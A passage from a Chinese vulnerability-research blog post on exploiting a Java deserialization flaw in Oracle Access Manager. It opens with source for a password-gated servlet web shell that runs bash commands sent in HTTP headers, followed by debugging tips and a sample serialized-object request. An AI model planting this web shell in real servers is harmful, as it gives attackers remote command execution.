</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-119-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-119-20>20</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServlet<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServletRequest<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServletResponse<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>memsHttpServlet</span> <span style=color:#66d9ef>extends</span> HttpServlet <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>doGet</span><span style=color:#f92672>(</span>HttpServletRequest req<span style=color:#f92672>,</span> HttpServletResponse resp<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        String passwd<span style=color:#f92672>=</span>req<span style=color:#f92672>.</span><span style=color:#a6e22e>getHeader</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;x-forwarded-fur&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span><span style=color:#f92672>(!</span><span style=color:#e6db74>&#34;p4ssw0rd!&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>passwd<span style=color:#f92672>)){</span><span style=color:#66d9ef>return</span><span style=color:#f92672>;}</span>
</span></span><span style=display:flex><span>        String<span style=color:#f92672>[]</span> cmdarray<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> String<span style=color:#f92672>[]{</span><span style=color:#e6db74>&#34;bash&#34;</span><span style=color:#f92672>,</span><span style=color:#e6db74>&#34;-c&#34;</span><span style=color:#f92672>,</span>req<span style=color:#f92672>.</span><span style=color:#a6e22e>getHeader</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;x-forwarded-far&#34;</span><span style=color:#f92672>)};</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            java<span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Scanner</span> s <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Scanner</span><span style=color:#f92672>(</span>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>getRuntime</span><span style=color:#f92672>().</span><span style=color:#a6e22e>exec</span><span style=color:#f92672>(</span>cmdarray<span style=color:#f92672>).</span><span style=color:#a6e22e>getInputStream</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>useDelimiter</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;\\A&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            resp<span style=color:#f92672>.</span><span style=color:#a6e22e>getWriter</span><span style=color:#f92672>().</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span>s<span style=color:#f92672>.</span><span style=color:#a6e22e>hasNext</span><span style=color:#f92672>()</span> <span style=color:#f92672>?</span> s<span style=color:#f92672>.</span><span style=color:#a6e22e>next</span><span style=color:#f92672>()</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=加密流量内存马>加密流量内存马<a hidden class=anchor aria-hidden=true href=#加密流量内存马>#</a></h3><p>待需要时实现。思路很简单，只要将异或、base64编码、rot13、AES加密等的进行排列组合即可。</p><h2 id=修复>修复<a hidden class=anchor aria-hidden=true href=#修复>#</a></h2><h1 id=调试技巧和常见问题>调试技巧和常见问题<a hidden class=anchor aria-hidden=true href=#调试技巧和常见问题>#</a></h1><p>这是笔者第一次相对深入地调试和利用实用的反序列化漏洞，在这个过程中领悟或学习到了一些有用的知识、方法和技巧，一并总结在此，以飨有需要的读者。</p><h2 id=重置到调用栈某个栈帧>重置到调用栈某个栈帧<a hidden class=anchor aria-hidden=true href=#重置到调用栈某个栈帧>#</a></h2><p>跟踪调试时有时会走过头，可以通过调用栈回溯来到之前的某个栈帧，恢复到当时的执行状态，重新分析。</p><p>回到上一级调用：</p><p><img loading=lazy src=image-20220711094424698.png alt=image-20220711094424698></p><p>回到之前任意一级的调用：</p><p><img loading=lazy src=image-20220711094644529.png alt=image-20220711094644529></p><p>有些版本的idea中这个功能通过点击栈信息前面的箭头实现：</p><p><img loading=lazy src=image-20220711094835694.png alt=image-20220711094835694></p><h2 id=异常断点如何应对从没有人遇到过的报错>异常断点：如何应对从没有人遇到过的报错<a hidden class=anchor aria-hidden=true href=#异常断点如何应对从没有人遇到过的报错>#</a></h2><p>调试有时候会走到人迹罕至的地方，如果遇到一个搜索引擎无法给出满意答复的报错（比如 <code>java.lang.NoClassDefFoundError</code> ），我们不知道是什么引起的，也不知道怎么解决。这个时候可以根据这个报错的异常信息下合适的异常断点，然后复现报错，观察堆栈。</p><p>比如在调试分析->去除Remotable接口章节中，就是通过下异常断点 <code>java.lang.NoClassDefFoundError</code> 快速重现和分析报错的。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-120-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-120-13>13</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-zed data-lang=zed><span style=display:flex><span><span style=color:#75715e>/**
</span></span></span><span style=display:flex><span><span style=color:#75715e> * Thrown if the Java Virtual Machine or a &lt;code&gt;ClassLoader&lt;/code&gt; instance
</span></span></span><span style=display:flex><span><span style=color:#75715e> * tries to load in the definition of a class (as part of a normal method call
</span></span></span><span style=display:flex><span><span style=color:#75715e> * or as part of creating a new instance using the &lt;code&gt;new&lt;/code&gt; expression)
</span></span></span><span style=display:flex><span><span style=color:#75715e> * and no definition of the class could be found.
</span></span></span><span style=display:flex><span><span style=color:#75715e> * &lt;p&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e> * The searched-for class definition existed when the currently
</span></span></span><span style=display:flex><span><span style=color:#75715e> * executing class was compiled, but the definition can no longer be
</span></span></span><span style=display:flex><span><span style=color:#75715e> * found.
</span></span></span><span style=display:flex><span><span style=color:#75715e> *
</span></span></span><span style=display:flex><span><span style=color:#75715e> * @author  unascribed
</span></span></span><span style=display:flex><span><span style=color:#75715e> * @since   JDK1.0
</span></span></span><span style=display:flex><span><span style=color:#75715e> */</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=条件断点限制断点触发场景减少干扰信息>条件断点：限制断点触发场景减少干扰信息<a hidden class=anchor aria-hidden=true href=#条件断点限制断点触发场景减少干扰信息>#</a></h2><p>有些断点的触发频率非常高，并且大部分触发情况都并不是我们所关心的。这时可以使用条件断点来减少干扰信息。异常断点和方法断点都支持使用条件来筛选。</p><p>例如</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-121-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-121-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-121-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-121-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-121-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-121-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-121-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-121-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>断点
</span></span><span style=display:flex><span>	java.lang.ClassNotFoundException
</span></span><span style=display:flex><span>条件
</span></span><span style=display:flex><span>	this.detailMessage.contains(&#34;internal.util.invoke.Remotable&#34;)
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220708172135011.png alt=image-20220708172135011></p><h2 id=evaluate-expression功能>Evaluate Expression功能<a hidden class=anchor aria-hidden=true href=#evaluate-expression功能>#</a></h2><p>idea提供的Evaluate Expression功能（快捷键Alt+f8）可以让我们在调试的时候在当前上下文中执行一些Java代码，测试一些表达式并获得结果，观察一些变量的值，是一个非常有用的功能，本文已在多处展示了它的用法。</p><p><img loading=lazy src=image-20220712114308548.png alt=image-20220712114308548></p><h2 id=如何确定jvm中是否加载了某个类>如何确定JVM中是否加载了某个类？<a hidden class=anchor aria-hidden=true href=#如何确定jvm中是否加载了某个类>#</a></h2><p>反序列化gadget跳转有时会报找不到类的错误，这个错误往往是native层代码报出来的，不能非常明确认定是什么原因导致的，这是我们会想要知道JVM中是否加载了我们需要的类。一个很好用的工具是arthas，它允许我们attach到Java进程上并在其中探索，在JVM内存中进行有限制的增删改查。我们可以利用arthas来确定JVM中是否加载了某个类。</p><p>参考：https://arthas.aliyun.com/doc/en/quick-start.html</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-122-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-122-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-122-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-122-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-122-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-122-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-122-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-122-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-122-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-122-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-122-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-122-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-122-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-122-7>7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-122-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-122-8>8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-122-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-122-9>9</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>安装arthas：
</span></span><span style=display:flex><span>docker exec -it oamms bash
</span></span><span style=display:flex><span>curl -O https://arthas.aliyun.com/arthas-boot.jar
</span></span><span style=display:flex><span>java -jar arthas-boot.jar
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>寻找JVM是否加载了类
</span></span><span style=display:flex><span>sc -d com.tangosol.internal.util.invoke.RemoteConstructor 
</span></span><span style=display:flex><span>sc -d *RemoteConstructor*
</span></span><span style=display:flex><span>sc -d oracle.security.am.proxy.opensso.controller.OpenssoEngineController
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220707114733622.png alt=image-20220707114733622></p><h2 id=如何不调试查看服务端某方法的返回值>如何不调试查看服务端某方法的返回值？<a hidden class=anchor aria-hidden=true href=#如何不调试查看服务端某方法的返回值>#</a></h2><p>除了查询JVM中已加载的类的信息外，arthas还有一些很棒的用法。</p><p>举个例子：在arthas终端执行以下命令，然后发送一个包含 oracle.security.am.proxy.opensso.session.utils.SessionID 对象的请求到 /oam/server/opensso/sessionservice 接口后，会打印出成功反序列化后的对象的信息。</p><p>执行命令：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-123-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-123-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>watch oracle.security.am.proxy.opensso.controller.OpenssoEngineController unmarshal returnObj
</span></span></code></pre></td></tr></table></div></div><p>发送请求：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-124-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-124-20>20</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>POST /oam/server/opensso/sessionservice HTTP/1.1
</span></span><span style=display:flex><span>Host: 192.168.175.139:14100
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept: */*
</span></span><span style=display:flex><span>Accept-Language: en
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q=0.9
</span></span><span style=display:flex><span>Content-Type: text/xml
</span></span><span style=display:flex><span>Content-Length: 906
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>RequestSet</span> <span style=color:#a6e22e>vers</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;vers123&#34;</span> <span style=color:#a6e22e>svcid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;session&#34;</span> <span style=color:#a6e22e>reqid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;req_1&#34;</span>&gt;
</span></span><span style=display:flex><span> &lt;<span style=color:#f92672>Request</span> <span style=color:#a6e22e>dtdid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;dtd1&#34;</span> <span style=color:#a6e22e>sid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;sid1&#34;</span>&gt;<span style=color:#75715e>&lt;![CDATA[
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;authIdentifier reqid=&#34;1&#34; requester=&#34;b2JqZWN0OnJPMEFCWE55QURodmNtRmpiR1V1YzJWamRYSnBkSGt1WVcwdWNISnZlSGt1YjNCbGJuTnpieTV6WlhOemFXOXVMblYwYVd4ekxsTmxjM05wYjI1SlJLOGVKQWl5c3BxUUFnQUhXZ0FJYVhOUVlYSnpaV1JNQUFwamIyOXJhV1ZOYjJSbGRBQVRUR3BoZG1FdmJHRnVaeTlDYjI5c1pXRnVPMHdBRDJWdVkzSjVjSFJsWkZOMGNtbHVaM1FBRWt4cVlYWmhMMnhoYm1jdlUzUnlhVzVuTzB3QURXVjRkR1Z1YzJsdmJsQmhjblJ4QUg0QUFrd0FDbVY0ZEdWdWMybHZibk4wQUE5TWFtRjJZUzkxZEdsc0wwMWhjRHRNQUE5elpYTnphVzl1VTJWeWRtVnlTVVJ4QUg0QUFrd0FCSFJoYVd4eEFINEFBbmh3QUhCMEFBTnVaVzl3YzNJQUVXcGhkbUV1ZFhScGJDNUlZWE5vVFdGd0JRZmF3Y01XWU5FREFBSkdBQXBzYjJGa1JtRmpkRzl5U1FBSmRHaHlaWE5vYjJ4a2VIQS9RQUFBQUFBQUFIY0lBQUFBRUFBQUFBQjRkQUFBY0E9PQ==&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;SessionID&gt;123&lt;/SessionID&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;/authIdentifier&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	]]&gt;</span>
</span></span><span style=display:flex><span> &lt;/<span style=color:#f92672>Request</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>RequestSet</span>&gt;
